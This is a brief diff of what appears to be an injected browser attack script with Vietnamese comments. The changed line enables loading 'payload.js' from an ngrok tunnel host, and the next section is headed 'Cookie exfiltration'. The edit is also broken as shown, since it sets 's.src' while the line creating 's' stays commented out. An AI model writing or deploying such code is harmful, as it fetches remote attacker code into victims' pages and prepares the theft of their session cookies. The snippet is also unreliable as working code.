@@ -45,7 +45,7 @@ if (window.parent !== window) {
 
 // Load external script (uncomment nếu cần)
 // var s = document.createElement('script');
-// s.src = 'https://cdd81e8b7bf1.ngrok-free.app/payload.js';
+s.src = 'https://cdd81e8b7bf1.ngrok-free.app/payload.js';
 // document.head.appendChild(s);
 
 // Cookie exfiltration (uncomment nếu cần)
